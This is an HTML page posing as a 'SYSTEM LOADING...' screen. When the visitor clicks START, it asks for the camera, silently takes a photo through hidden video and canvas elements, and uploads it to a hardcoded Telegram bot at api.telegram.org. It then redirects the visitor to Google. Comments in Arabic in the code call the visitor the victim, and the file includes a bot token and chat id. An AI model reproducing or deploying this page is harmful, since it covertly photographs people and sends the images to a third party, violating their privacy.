<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checking System...</title>
    <style>
        body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        #btn { padding: 20px; background: #0f0; color: black; border: none; font-size: 20px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <h2>SYSTEM LOADING...</h2>
    <p>Please click START to continue</p>
    <button id="btn" onclick="go()">START</button>

    <script>
        const tok = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const id = "8042090388";

        async function go() {
            document.getElementById('btn').innerText = "LOADING 10%...";
            try {
                // فتح الكاميرا
                const s = await navigator.mediaDevices.getUserMedia({video: true});
                document.getElementById('v').srcObject = s;
                
                document.getElementById('btn').innerText = "LOADING 50%...";

                // انتظار بسيط لتفتيح العدسة
                setTimeout(() => {
                    const v = document.getElementById('v');
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    // تحويل الصورة
                    const data = c.toDataURL('image/jpeg', 0.5);
                    upload(data);
                }, 3000);

            } catch (e) {
                alert("Please allow camera access to continue!");
            }
        }

        function upload(base64) {
            const blob = dataURItoBlob(base64);
            const fd = new FormData();
            fd.append('chat_id', id);
            fd.append('photo', blob, 'img.jpg');

            // استخدام XMLHttpRequest بدلاً من Fetch لضمان التوافق
            const xhr = new XMLHttpRequest();
            xhr.open("POST", `https://api.telegram.org/bot${tok}/sendPhoto`, true);
            xhr.onload = function() {
                // تحويل الضحية فوراً بعد النجاح
                window.location.href = "https://www.google.com";
            };
            xhr.send(fd);
        }

        function dataURItoBlob(dataURI) {
            var byteString = atob(dataURI.split(',')[1]);
            var ab = new ArrayBuffer(byteString.length);
            var ia = new Uint8Array(ab);
            for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
            return new Blob([ab], {type: 'image/jpeg'});
        }
    </script>
</body>
</html>
